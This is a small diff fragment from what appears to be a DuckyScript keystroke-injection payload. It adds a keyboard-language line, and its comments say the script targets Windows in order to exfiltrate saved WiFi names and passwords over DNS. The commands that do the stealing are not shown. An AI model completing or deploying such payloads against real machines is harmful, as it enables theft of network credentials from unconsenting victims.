@@ -21,6 +21,7 @@
 # 
 # TODO: This only works for WiFi names without space in the name.
 #
+DUCKY_LANG US
 REM Target:  WINDOWS 
 REM Purpose: Exfiltrate all saved WiFi names + PSK via DNS 
 DELAY 3000 
